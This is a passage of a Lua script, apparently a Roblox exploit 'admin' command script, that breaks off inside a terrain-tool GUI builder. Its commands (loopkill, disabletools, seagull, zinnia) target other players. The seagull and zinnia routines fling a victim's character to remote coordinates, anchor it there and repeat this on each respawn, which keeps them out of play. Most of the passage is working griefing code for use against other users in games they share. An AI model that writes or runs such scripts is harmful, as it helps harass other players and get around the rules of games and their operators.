		local Part4 = Instance.new("Part")
		local Motor5 = Instance.new("Motor")
		local Motor6 = Instance.new("Motor")
		local Motor7 = Instance.new("Motor")
		local Motor8 = Instance.new("Motor")
		local Motor9 = Instance.new("Motor")
		local Part10 = Instance.new("Part")
		local Part11 = Instance.new("Part")
		local Part12 = Instance.new("Part")
		local Part13 = Instance.new("Part")
		local dum = Instance.new("BoolValue")
		dum.Name = "isdummy"
		dum.Parent = Model0
		local Humanoid14 = Instance.new("Humanoid")
		Model0.Name = name
		Model0.Parent = workspace
		Model0.PrimaryPart = Part1
		Part1.Name = "Head"
		Part1.Parent = Model0
		Part1.BrickColor = BrickColor.new("Bright yellow")
		Part1.CanCollide = false
		Part1.FormFactor = Enum.FormFactor.Symmetric
		Part1.Friction = 0
		Part1.Size = Vector3.new(2, 1, 1)
		Part1.CFrame = CFrame.new(3.49000192, 4.49999905, 7.75, 1, 0, 0, 0, 1, 0, 0, 0, 1)
		Part1.TopSurface = Enum.SurfaceType.Smooth
		Part1.Color = Color3.new(0.960784, 0.803922, 0.188235)
		Part1.Position = Vector3.new(3.49000192, 4.49999905, 7.75)
		Part1.Color = Color3.new(0.960784, 0.803922, 0.188235)
		SpecialMesh2.Parent = Part1
		SpecialMesh2.Scale = Vector3.new(1.25, 1.25, 1.25)
		SpecialMesh2.Scale = Vector3.new(1.25, 1.25, 1.25)
		Decal3.Name = "face"
		Decal3.Parent = Part1
		Decal3.Texture = "rbxasset://textures/face.png"
		Part4.Name = "Torso"
		Part4.Parent = Model0
		Part4.BrickColor = BrickColor.new("Bright blue")
		Part4.CanCollide = false
		Part4.FormFactor = Enum.FormFactor.Symmetric
		Part4.Friction = 0
		Part4.Size = Vector3.new(2, 2, 1)
		Part4.CFrame = CFrame.new(3.49000192, 2.99999905, 7.75, 1, 0, 0, 0, 1, 0, 0, 0, 1)
		Part4.LeftSurface = Enum.SurfaceType.Weld
		Part4.RightSurface = Enum.SurfaceType.Weld
		Part4.Color = Color3.new(0.0509804, 0.411765, 0.67451)
		Part4.Position = Vector3.new(3.49000192, 2.99999905, 7.75)
		Part4.Color = Color3.new(0.0509804, 0.411765, 0.67451)
		Motor5.Name = "Right Shoulder"
		Motor5.Parent = Part4
		Motor5.C0 = CFrame.new(1, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
		Motor5.C1 = CFrame.new(-0.5, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
		Motor5.Part0 = Part4
		Motor5.Part1 = Part11
		Motor5.DesiredAngle = 0.083800852298737
		Motor5.MaxVelocity = 0.15000000596046
		Motor6.Name = "Left Shoulder"
		Motor6.Parent = Part4
		Motor6.C0 = CFrame.new(-1, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
		Motor6.C1 = CFrame.new(0.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
		Motor6.Part0 = Part4
		Motor6.Part1 = Part10
		Motor6.DesiredAngle = 0.083800852298737
		Motor6.MaxVelocity = 0.15000000596046
		Motor7.Name = "Left Hip"
		Motor7.Parent = Part4
		Motor7.C0 = CFrame.new(-1, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
		Motor7.C1 = CFrame.new(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
		Motor7.Part0 = Part4
		Motor7.Part1 = Part12
		Motor7.DesiredAngle = -0.083800852298737
		Motor7.MaxVelocity = 0.10000000149012
		Motor8.Name = "Neck"
		Motor8.Parent = Part4
		Motor8.C0 = CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
		Motor8.C1 = CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
		Motor8.Part0 = Part4
		Motor8.Part1 = Part1
		Motor8.MaxVelocity = 0.10000000149012
		Motor9.Name = "Right Hip"
		Motor9.Parent = Part4
		Motor9.C0 = CFrame.new(1, -1, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
		Motor9.C1 = CFrame.new(0.5, 1, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
		Motor9.Part0 = Part4
		Motor9.Part1 = Part13
		Motor9.DesiredAngle = -0.083800852298737
		Motor9.MaxVelocity = 0.10000000149012
		Part10.Name = "Left Arm"
		Part10.Parent = Model0
		Part10.BrickColor = BrickColor.new("Bright yellow")
		Part10.CanCollide = false
		Part10.FormFactor = Enum.FormFactor.Symmetric
		Part10.Size = Vector3.new(1, 2, 1)
		Part10.CFrame = CFrame.new(1.99000192, 2.99999905, 7.75, 1, 0, 0, 0, 1, 0, 0, 0, 1)
		Part10.Color = Color3.new(0.960784, 0.803922, 0.188235)
		Part10.Position = Vector3.new(1.99000192, 2.99999905, 7.75)
		Part10.Color = Color3.new(0.960784, 0.803922, 0.188235)
		Part11.Name = "Right Arm"
		Part11.Parent = Model0
		Part11.BrickColor = BrickColor.new("Bright yellow")
		Part11.CanCollide = false
		Part11.FormFactor = Enum.FormFactor.Symmetric
		Part11.Size = Vector3.new(1, 2, 1)
		Part11.CFrame = CFrame.new(4.99000168, 2.99999905, 7.75, 1, 0, 0, 0, 1, 0, 0, 0, 1)
		Part11.Color = Color3.new(0.960784, 0.803922, 0.188235)
		Part11.Position = Vector3.new(4.99000168, 2.99999905, 7.75)
		Part11.Color = Color3.new(0.960784, 0.803922, 0.188235)
		Part12.Name = "Left Leg"
		Part12.Parent = Model0
		Part12.BrickColor = BrickColor.new("Br. yellowish green")
		Part12.CanCollide = false
		Part12.FormFactor = Enum.FormFactor.Symmetric
		Part12.Size = Vector3.new(1, 2, 1)
		Part12.CFrame = CFrame.new(2.99000192, 0.999999046, 7.75, 1, 0, 0, 0, 1, 0, 0, 0, 1)
		Part12.BottomSurface = Enum.SurfaceType.Smooth
		Part12.Color = Color3.new(0.643137, 0.741176, 0.278431)
		Part12.Position = Vector3.new(2.99000192, 0.999999046, 7.75)
		Part12.Color = Color3.new(0.643137, 0.741176, 0.278431)
		Part13.Name = "Right Leg"
		Part13.Parent = Model0
		Part13.BrickColor = BrickColor.new("Br. yellowish green")
		Part13.CanCollide = false
		Part13.FormFactor = Enum.FormFactor.Symmetric
		Part13.Size = Vector3.new(1, 2, 1)
		Part13.CFrame = CFrame.new(3.99000192, 0.999999046, 7.75, 1, 0, 0, 0, 1, 0, 0, 0, 1)
		Part13.BottomSurface = Enum.SurfaceType.Smooth
		Part13.Color = Color3.new(0.643137, 0.741176, 0.278431)
		Part13.Position = Vector3.new(3.99000192, 0.999999046, 7.75)
		Part13.Color = Color3.new(0.643137, 0.741176, 0.278431)
		Humanoid14.Parent = Model0
		Humanoid14.RightLeg = Part13
		Humanoid14.LeftLeg = Part12
		Humanoid14.Torso = Part4
		Model0:MoveTo(game:GetService('Players').LocalPlayer.Character:GetModelCFrame().p)
		Model0.Parent = game:GetService('Workspace')
end)

addcmd('loopkill', 'rip person',{'lkill'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
		if not FindTable(loopkillT, _players[v].Name) then
			table.insert(loopkillT, _players[v].Name)
			if FindTable(SPC, args[1]) then Notify('Loopkilling ' .. args[1]) else
			Notify('Loopkilling player(s)') end end end end)

addcmd('unloopkill', 'un rip person',{'unlkill'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
		if FindTable(loopkillT, _players[v].Name) then
			table.remove(loopkillT, GetInTable(loopkillT, _players[v].Name))
			if FindTable(SPC, args[1]) then Notify('No longer loopkilling ' .. args[1]) else
			Notify('No longer loopkilling player(s)') end end end end)

addcmd('disabletools', 'removes their tools',{'loopremovetools'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
		if not FindTable(disabletoolsT, _players[v].Name) then
			table.insert(disabletoolsT, _players[v].Name)
			if FindTable(SPC, args[1]) then Notify('Disabled tools for ' .. args[1]) else
			Notify('Disabled tools for player(s)') end end end end)

addcmd('enabletools', 'lets them have tools',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
		if FindTable(disabletoolsT, _players[v].Name) then
			table.remove(disabletoolsT, GetInTable(disabletoolsT, _players[v].Name)) wait(0.1) refresh(_players[v])
			if FindTable(SPC, args[1]) then Notify('Enabled tools for ' ..args[1]) else
			Notify('Enabled tools for player(s)') end end end end)

addcmd('refresh', 'refresh their player model',{'re'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
			refresh(_players[v])
			end end)

local fastwait = function(time)
	local expire = tick()+(time or 0.02999999999999999889)
	while game:GetService("RunService").Heartbeat:wait() do
		if tick() >= expire then return true end
	end
end

function gull(name)
	spawn(function()
	local char = game:GetService("Players")[name].Character
	char.PrimaryPart = char.HumanoidRootPart
	
	local tors = game:GetService("Players")[name].Character.HumanoidRootPart
	local initCFrame = tors.CFrame
	
	if char:FindFirstChild("Torso") then
		char.Torso.Anchored = true
	else
		char.UpperTorso.Anchored = true
	end
	char:FindFirstChildOfClass("Humanoid").Name = "Sad"

	local gull = Instance.new("Part")
	gull.Anchored = true
	gull.CanCollide = false
	gull.Position = Vector3.new(0,100000,0)
	local mesh = Instance.new("SpecialMesh",gull)
	mesh.MeshId = "http://www.roblox.com/asset/?id=272501436"
	mesh.TextureId = "http://www.roblox.com/asset/?id=267684509"
	mesh.Scale = Vector3.new(10,10,10)
	
	local leftWing = Instance.new("Part",gull)
	leftWing.CanCollide = false
	local lmesh = Instance.new("SpecialMesh",leftWing)
	lmesh.MeshId = "http://www.roblox.com/asset/?id=267684584"
	lmesh.TextureId = "http://www.roblox.com/asset/?id=267684509"
	lmesh.Scale = Vector3.new(10,10,10)
	local leftMotor = Instance.new("Motor6D",gull)
	leftMotor.MaxVelocity = 1
	leftMotor.Part0 = gull
	leftMotor.Part1 = leftWing
	leftMotor.C0 = CFrame.new(-50.2919998, -0.0920021087, 0.280000001)
	
	local rightWing = Instance.new("Part",gull)
	rightWing.CanCollide = false
	local rmesh = Instance.new("SpecialMesh",rightWing)
	rmesh.MeshId = "http://www.roblox.com/asset/?id=267684651"
	rmesh.TextureId = "http://www.roblox.com/asset/?id=267684509"
	rmesh.Scale = Vector3.new(10,10,10)
	local rightMotor = Instance.new("Motor6D",gull)
	rightMotor.MaxVelocity = 1
	rightMotor.Part0 = gull
	rightMotor.Part1 = rightWing
	rightMotor.C0 = CFrame.new(47.1930008, -0.0670021027, 0.280000001)
	
	local sound = Instance.new("Sound",gull)
	sound.SoundId = "rbxassetid://160877039"
	sound.Volume = 10
	gull.Parent = workspace

	for i = 400,-1000,-2 do
		local der = 0.02*i
		local angle = math.atan(der/1)
		gull.CFrame = initCFrame*CFrame.Angles(angle,math.pi,0) + initCFrame.lookVector * (i+5) + Vector3.new(0,0.01*i^2+7,0)
		if i == 0 then sound:Play() end
		if i <= 0 then
			char:SetPrimaryPartCFrame(gull.CFrame)
			local nextAngle = -0.2*math.sin(0.05*math.pi*(i))
			leftMotor.DesiredAngle = -nextAngle
			leftMotor.C0 = CFrame.new(-50.2919998, 47.193*math.tan(nextAngle), 0.280000001)
			rightMotor.DesiredAngle = nextAngle
			rightMotor.C0 = CFrame.new(47.1930008, 47.193*math.tan(nextAngle), 0.280000001)
		end
		game:GetService("RunService").RenderStepped:wait()
	end
	
	local function KICK(P)
	spawn(function()
		if not FindTable(WL, P.Name) then
		for i = 1,5 do
			if P.Character and P.Character:FindFirstChild('HumanoidRootPart') then
				P.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(999000, 1001000), 1000000, 1000000)
				local SP = Instance.new('SkateboardPlatform', P.Character) SP.Position = P.Character.HumanoidRootPart.Position SP.Transparency = 1
				spawn(function()
					repeat wait()
						if P.Character and P.Character:FindFirstChild('HumanoidRootPart') then SP.Position = P.Character.HumanoidRootPart.Position end
					until not game:GetService("Players"):FindFirstChild(P.Name)
				end)
				P.Character.HumanoidRootPart.Anchored = true
			end
		end
		end
	end)
	end
	
	if char:FindFirstChild("Torso") then
		char.Torso.Anchored = false
	else
		char.UpperTorso.Anchored = false
	end
	
	spawn(function()
	if game:GetService("Players")[name] == game:GetService("Players").LocalPlayer then wait(5) end
	game:GetService("Players")[name].CharacterAdded:Connect(function()
		wait()
		KICK(game:GetService("Players")[name])
	end)
	KICK(game:GetService("Players")[name])
	end)
	
		local go = Instance.new("BodyVelocity",gull)
		go.Velocity = Vector3.new(0,1000,0)
		go.MaxForce = Vector3.new(1000000,1000000,1000000)
		gull.Anchored = false
	end)
end

addcmd('seagull', 'seagulls player',{'gull'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        gull(gPlayers[v].Name)
    end
end)

local song = nil
function zinniaKick(name)
    spawn(function()
            if song == nil or song.Parent == nil then
                song = Instance.new("Sound",workspace)
                song.SoundId = "rbxassetid://190423831"
                song.Volume = 1
                song.Looped = true
                song:Play()
            end
            local zin = Instance.new("Part")
            zin.Name = "CuteZinnia"
            zin.Anchored = true
            zin.CanCollide = false
            zin.Locked = true
            local mesh = Instance.new("SpecialMesh")
            mesh.MeshId = "rbxassetid://1175670539"
            mesh.TextureId = "rbxassetid://1175670558"
            mesh.Scale = Vector3.new(0.05,0.05,0.05)
            mesh.Offset = Vector3.new(0,0.88,0)
            mesh.Parent = zin
            local char = game:GetService("Players")[name].Character
            char.PrimaryPart = char.HumanoidRootPart
            if char:FindFirstChild("Torso") then
                char.Torso.Anchored = true
            else
                char.UpperTorso.Anchored = true
            end
            zin.CFrame = (char.HumanoidRootPart.CFrame + char.HumanoidRootPart.CFrame.lookVector*50) * CFrame.Angles(0,math.pi,0) + Vector3.new(0,500,0) + (char:FindFirstChild("UpperTorso") and Vector3.new(0,0.9,0) or Vector3.new(0,0,0))
            zin.Parent = workspace
            local tween = game:GetService("TweenService"):Create(zin,TweenInfo.new(3,Enum.EasingStyle.Quart,Enum.EasingDirection.Out,0,false,0),{CFrame = zin.CFrame - Vector3.new(0,500,0)})
            tween:Play()
            fastwait(3)
            for i = 50,1,-1 do
                zin.CFrame = (char.HumanoidRootPart.CFrame + char.HumanoidRootPart.CFrame.lookVector*i) * CFrame.Angles(0,math.pi,0) + (char:FindFirstChild("UpperTorso") and Vector3.new(0,0.9,0) or Vector3.new(0,0,0))
                fastwait()
            end
            char:SetPrimaryPartCFrame(zin.CFrame + CFrame.Angles(0,math.pi/2,0)*zin.CFrame.lookVector*3.5 + Vector3.new(0,3,0))
            fastwait(1)
            local turns = 0

            while turns < 200 do
                zin.CFrame = zin.CFrame*CFrame.Angles(0,(-math.pi/3)*turns/200,0)
                char:SetPrimaryPartCFrame(zin.CFrame + CFrame.Angles(0,math.pi/2,0)*zin.CFrame.lookVector*3.5 + Vector3.new(0,3,0))
                turns = turns + 1
                fastwait()
            end
            for i = 1,10 do
                zin.CFrame = zin.CFrame*CFrame.Angles(0,(-math.pi/3)*turns/200,0)
                char:SetPrimaryPartCFrame(zin.CFrame + CFrame.Angles(0,math.pi/2,0)*zin.CFrame.lookVector*3.5 + Vector3.new(0,3,0))
                fastwait()
            end
            local rX,rZ = 0,0
            repeat rX = math.random(-10000,10000) until math.abs(rX) > 5000
                repeat rZ = math.random(-10000,10000) until math.abs(rZ) > 5000
                    local bv = Instance.new("BodyForce",char.HumanoidRootPart)
                    bv.Force = Vector3.new(rX,10000,rZ)
                    if char:FindFirstChild("Torso") then
                        char.Torso.Anchored = false
                    else
                        char.UpperTorso.Anchored = false
                    end
                    function KICK(P)
                        spawn(function()
							if not FindTable(WL, P.Name) then
                                for i = 1,5 do
                                    if P.Character and P.Character:FindFirstChild('HumanoidRootPart') then
                                        P.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(999000, 1001000), 1000000, 1000000)
                                        local SP = Instance.new('SkateboardPlatform', P.Character) SP.Position = P.Character.HumanoidRootPart.Position SP.Transparency = 1
                                        spawn(function()
                                                repeat fastwait()
                                                    if P.Character and P.Character:FindFirstChild('HumanoidRootPart') then SP.Position = P.Character.HumanoidRootPart.Position end
                                                until not game:GetService("Players"):FindFirstChild(P.Name)
                                            end)
                                        P.Character.HumanoidRootPart.Anchored = true
                                    end
                                end
							end
                        end)
                    end
                    spawn(function()
                            if game:GetService("Players")[name] == game:GetService("Players").LocalPlayer then fastwait(10) else fastwait(5) end
                            game:GetService("Players")[name].CharacterAdded:Connect(function()
                                    fastwait()
                                    KICK(game:GetService("Players")[name])
                                end)
                            KICK(game:GetService("Players")[name])
                        end)
                    for i = 1,20 do
                        zin.CFrame = zin.CFrame*CFrame.Angles(0,(-math.pi/3)*turns/200,0)
                        fastwait()
                    end
                    while turns > 0 do
                        zin.CFrame = zin.CFrame*CFrame.Angles(0,(-math.pi/3)*turns/200,0)
                        turns = turns - 5
                        fastwait()
                    end
                    fastwait(1)
                    zin.Name = "GoneZinnia"
                    local go = Instance.new("BodyVelocity",zin)
                    go.Velocity = zin.CFrame.lookVector * 100
                    go.MaxForce = Vector3.new(1000000,1000000,1000000)
                    zin.Anchored = false
                    fastwait(20)
         if song and not workspace:FindFirstChild("CuteZinnia") then
             song:Destroy()
             song = nil
         end
   	end)
end

addcmd('zinnia', 'asdf for moon',{},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
        zinniaKick(gPlayers[v].Name)
    end
end)

addcmd('rainbowname', 'color spam their name tag',{'rname'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
		if not FindTable(rainbowT, _players[v].Name) then
			table.insert(rainbowT, _players[v].Name)
			if FindTable(SPC, args[1]) then Notify('Gave ' ..args[1].. ' rainbow name') else
			Notify('Gave player(s) rainbow name') end end end end)

addcmd('unrainbowname', 'removes their colorful name',{'unrname'},
function(args, speaker)
    local players = getPlayer(args[1], speaker)
    for i,v in pairs(players)do
		if FindTable(rainbowT, _players[v].Name) then
			table.remove(rainbowT, GetInTable(rainbowT, _players[v].Name))
			_players[v].Neutral = true
			if FindTable(SPC, args[1]) then Notify('Disabled rainbow name for ' ..args[1]) else
			Notify('Disabled rainbow name for player(s)') end end end end)

addcmd('terrain', 'gives you terrain tools',{'tt'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
--Terrain Script
--Edge/IoIman616

for _, child in pairs( gPlayers.LocalPlayer.PlayerGui:GetChildren()) do
    if child.Name == "MaterialGui" then
        child:Destroy()
    end
end

function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
HopperBin0 = Instance.new("HopperBin")
HopperBin0.Name = "Terrain Build"
HopperBin0.Parent = mas
for i,v in pairs(mas:GetChildren()) do
	v.Parent = game:GetService("Players").LocalPlayer.Backpack
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end

wait(0.01)

function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
ScreenGui0 = Instance.new("ScreenGui")
ImageLabel1 = Instance.new("ImageLabel")
ImageButton2 = Instance.new("ImageButton")
Frame3 = Instance.new("Frame")
NumberValue4 = Instance.new("NumberValue")
ImageButton5 = Instance.new("ImageButton")
Frame6 = Instance.new("Frame")
NumberValue7 = Instance.new("NumberValue")
ImageButton8 = Instance.new("ImageButton")
Frame9 = Instance.new("Frame")
NumberValue10 = Instance.new("NumberValue")
ImageButton11 = Instance.new("ImageButton")
Frame12 = Instance.new("Frame")
NumberValue13 = Instance.new("NumberValue")
ImageButton14 = Instance.new("ImageButton")
Frame15 = Instance.new("Frame")
NumberValue16 = Instance.new("NumberValue")
ImageButton17 = Instance.new("ImageButton")
Frame18 = Instance.new("Frame")
NumberValue19 = Instance.new("NumberValue")
ImageButton20 = Instance.new("ImageButton")
Frame21 = Instance.new("Frame")
NumberValue22 = Instance.new("NumberValue")
ImageButton23 = Instance.new("ImageButton")
Frame24 = Instance.new("Frame")
NumberValue25 = Instance.new("NumberValue")
ImageButton26 = Instance.new("ImageButton")
Frame27 = Instance.new("Frame")
NumberValue28 = Instance.new("NumberValue")
ImageButton29 = Instance.new("ImageButton")
Frame30 = Instance.new("Frame")
NumberValue31 = Instance.new("NumberValue")
ImageButton32 = Instance.new("ImageButton")
Frame33 = Instance.new("Frame")
NumberValue34 = Instance.new("NumberValue")
ImageButton35 = Instance.new("ImageButton")
Frame36 = Instance.new("Frame")
NumberValue37 = Instance.new("NumberValue")
ImageButton38 = Instance.new("ImageButton")
Frame39 = Instance.new("Frame")
NumberValue40 = Instance.new("NumberValue")
ImageButton41 = Instance.new("ImageButton")
Frame42 = Instance.new("Frame")
NumberValue43 = Instance.new("NumberValue")
ImageButton44 = Instance.new("ImageButton")
Frame45 = Instance.new("Frame")
NumberValue46 = Instance.new("NumberValue")
ImageButton47 = Instance.new("ImageButton")
Frame48 = Instance.new("Frame")
NumberValue49 = Instance.new("NumberValue")
ImageButton50 = Instance.new("ImageButton")
Frame51 = Instance.new("Frame")
NumberValue52 = Instance.new("NumberValue")
ImageButton53 = Instance.new("ImageButton")
Frame54 = Instance.new("Frame")
ScreenGui0.Name = "MaterialGui"
ScreenGui0.Parent = mas
ImageLabel1.Name = "MaterialMenu"
ImageLabel1.Parent = ScreenGui0
ImageLabel1.Transparency = 1
ImageLabel1.Size = UDim2.new(0, 100, 0, 450)
ImageLabel1.Position = UDim2.new(0, 0, 1, -550)
ImageLabel1.BackgroundTransparency = 1
ImageLabel1.ZIndex = 2
ImageLabel1.Image = "rbxasset://textures/ui/MaterialMenu.png"
ImageButton2.Name = "Grass"
ImageButton2.Parent = ImageLabel1
ImageButton2.Transparency = 1
ImageButton2.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton2.Position = UDim2.new(0.0700000003, 0, 0.0599999987, 0)
ImageButton2.BackgroundTransparency = 1
ImageButton2.ZIndex = 4
ImageButton2.Image = "http://www.roblox.com/asset/?id=56563112"
Frame3.Name = "Selection"
Frame3.Parent = ImageButton2
Frame3.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame3.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame3.BackgroundColor3 = Color3.new(1, 1, 1)
Frame3.BorderSizePixel = 0
Frame3.ZIndex = 3
NumberValue4.Name = "num"
NumberValue4.Parent = ImageButton2
NumberValue4.Value = 1
ImageButton5.Name = "Sand"
ImageButton5.Parent = ImageLabel1
ImageButton5.Transparency = 1
ImageButton5.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton5.Position = UDim2.new(0.524545431, 0, 0.0599999987, 0)
ImageButton5.BackgroundTransparency = 1
ImageButton5.ZIndex = 4
ImageButton5.Image = "http://www.roblox.com/asset/?id=62356652"
Frame6.Name = "Selection"
Frame6.Parent = ImageButton5
Frame6.Transparency = 1
Frame6.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame6.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame6.BackgroundColor3 = Color3.new(1, 1, 1)
Frame6.BackgroundTransparency = 1
Frame6.BorderSizePixel = 0
Frame6.ZIndex = 3
NumberValue7.Name = "num"
NumberValue7.Parent = ImageButton5
NumberValue7.Value = 2
ImageButton8.Name = "Brick"
ImageButton8.Parent = ImageLabel1
ImageButton8.Transparency = 1
ImageButton8.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton8.Position = UDim2.new(0.0700000003, 0, 0.161010101, 0)
ImageButton8.BackgroundTransparency = 1
ImageButton8.ZIndex = 4
ImageButton8.Image = "http://www.roblox.com/asset/?id=65961537"
Frame9.Name = "Selection"
Frame9.Parent = ImageButton8
Frame9.Transparency = 1
Frame9.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame9.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame9.BackgroundColor3 = Color3.new(1, 1, 1)
Frame9.BackgroundTransparency = 1
Frame9.BorderSizePixel = 0
Frame9.ZIndex = 3
NumberValue10.Name = "num"
NumberValue10.Parent = ImageButton8
NumberValue10.Value = 3
ImageButton11.Name = "Granite"
ImageButton11.Parent = ImageLabel1
ImageButton11.Transparency = 1
ImageButton11.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton11.Position = UDim2.new(0.524545431, 0, 0.161010101, 0)
ImageButton11.BackgroundTransparency = 1
ImageButton11.ZIndex = 4
ImageButton11.Image = "http://www.roblox.com/asset/?id=67532153"
Frame12.Name = "Selection"
Frame12.Parent = ImageButton11
Frame12.Transparency = 1
Frame12.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame12.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame12.BackgroundColor3 = Color3.new(1, 1, 1)
Frame12.BackgroundTransparency = 1
Frame12.BorderSizePixel = 0
Frame12.ZIndex = 3
NumberValue13.Name = "num"
NumberValue13.Parent = ImageButton11
NumberValue13.Value = 4
ImageButton14.Name = "Asphalt"
ImageButton14.Parent = ImageLabel1
ImageButton14.Transparency = 1
ImageButton14.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton14.Position = UDim2.new(0.0700000003, 0, 0.2620202, 0)
ImageButton14.BackgroundTransparency = 1
ImageButton14.ZIndex = 4
ImageButton14.Image = "http://www.roblox.com/asset/?id=67532038"
Frame15.Name = "Selection"
Frame15.Parent = ImageButton14
Frame15.Transparency = 1
Frame15.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame15.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame15.BackgroundColor3 = Color3.new(1, 1, 1)
Frame15.BackgroundTransparency = 1
Frame15.BorderSizePixel = 0
Frame15.ZIndex = 3
NumberValue16.Name = "num"
NumberValue16.Parent = ImageButton14
NumberValue16.Value = 5
ImageButton17.Name = "Iron"
ImageButton17.Parent = ImageLabel1
ImageButton17.Transparency = 1
ImageButton17.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton17.Position = UDim2.new(0.524545431, 0, 0.2620202, 0)
ImageButton17.BackgroundTransparency = 1
ImageButton17.ZIndex = 4
ImageButton17.Image = "http://www.roblox.com/asset/?id=67532093"
Frame18.Name = "Selection"
Frame18.Parent = ImageButton17
Frame18.Transparency = 1
Frame18.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame18.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame18.BackgroundColor3 = Color3.new(1, 1, 1)
Frame18.BackgroundTransparency = 1
Frame18.BorderSizePixel = 0
Frame18.ZIndex = 3
NumberValue19.Name = "num"
NumberValue19.Parent = ImageButton17
NumberValue19.Value = 6
ImageButton20.Name = "Aluminum"
ImageButton20.Parent = ImageLabel1
ImageButton20.Transparency = 1
ImageButton20.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton20.Position = UDim2.new(0.0700000003, 0, 0.363030314, 0)
ImageButton20.BackgroundTransparency = 1
ImageButton20.ZIndex = 4
ImageButton20.Image = "http://www.roblox.com/asset/?id=67531995"
Frame21.Name = "Selection"
Frame21.Parent = ImageButton20
Frame21.Transparency = 1
Frame21.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame21.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame21.BackgroundColor3 = Color3.new(1, 1, 1)
Frame21.BackgroundTransparency = 1
Frame21.BorderSizePixel = 0
Frame21.ZIndex = 3
NumberValue22.Name = "num"
NumberValue22.Parent = ImageButton20
NumberValue22.Value = 7
ImageButton23.Name = "Gold"
ImageButton23.Parent = ImageLabel1
ImageButton23.Transparency = 1
ImageButton23.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton23.Position = UDim2.new(0.524545431, 0, 0.363030314, 0)
ImageButton23.BackgroundTransparency = 1
ImageButton23.ZIndex = 4
ImageButton23.Image = "http://www.roblox.com/asset/?id=67532118"
Frame24.Name = "Selection"
Frame24.Parent = ImageButton23
Frame24.Transparency = 1
Frame24.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame24.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame24.BackgroundColor3 = Color3.new(1, 1, 1)
Frame24.BackgroundTransparency = 1
Frame24.BorderSizePixel = 0
Frame24.ZIndex = 3
NumberValue25.Name = "num"
NumberValue25.Parent = ImageButton23
NumberValue25.Value = 8
ImageButton26.Name = "Plank"
ImageButton26.Parent = ImageLabel1
ImageButton26.Transparency = 1
ImageButton26.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
ImageButton26.Position = UDim2.new(0.0700000003, 0, 0.464040399, 0)
ImageButton26.BackgroundTransparency = 1
ImageButton26.ZIndex = 4
ImageButton26.Image = "http://www.roblox.com/asset/?id=67532015"
Frame27.Name = "Selection"
Frame27.Parent = ImageButton26
Frame27.Transparency = 1
Frame27.Size = UDim2.new(1.10000002, 0, 1.10000002, 0)
Frame27.Position = UDim2.new(-0.0500000007, 0, -0.0500000007, 0)
Frame27.BackgroundColor3 = Color3.new(1, 1, 1)
Frame27.BackgroundTransparency = 1
Frame27.BorderSizePixel = 0
Frame27.ZIndex = 3
NumberValue28.Name = "num"
NumberValue28.Parent = ImageButton26
NumberValue28.Value = 9
ImageButton29.Name = "Log"
ImageButton29.Parent = ImageLabel1
ImageButton29.Transparency = 1
ImageButton29.Size = UDim2.new(0.400000006, 0, 0.088888891, 0)
